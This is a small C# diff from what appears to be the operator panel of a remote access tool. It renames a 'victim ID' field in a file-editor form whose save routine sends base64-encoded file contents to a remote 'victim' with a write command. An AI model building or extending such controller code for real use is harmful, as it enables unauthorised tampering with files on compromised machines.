@@ -18,7 +18,7 @@ namespace Eden
     public partial class frmFileEditor : Form
     {
         public Client m_clnt;
-        public string szVictimID;
+        public string m_szVictimID;
 
         private struct stTabInfoTag
         {
@@ -121,7 +121,7 @@ namespace Eden
                     page = tabControl1.SelectedTab;
 
                 var x = GetTabPageControls(page);
-                m_clnt.SendVictim(szVictimID, $"File|write|{EZCrypto.Encoder.stre2b64(x.editorEx.Text)}");
+                m_clnt.SendVictim(m_szVictimID, $"File|write|{EZCrypto.Encoder.stre2b64(x.editorEx.Text)}");
             }));
         }
         private void SaveAllFiles()
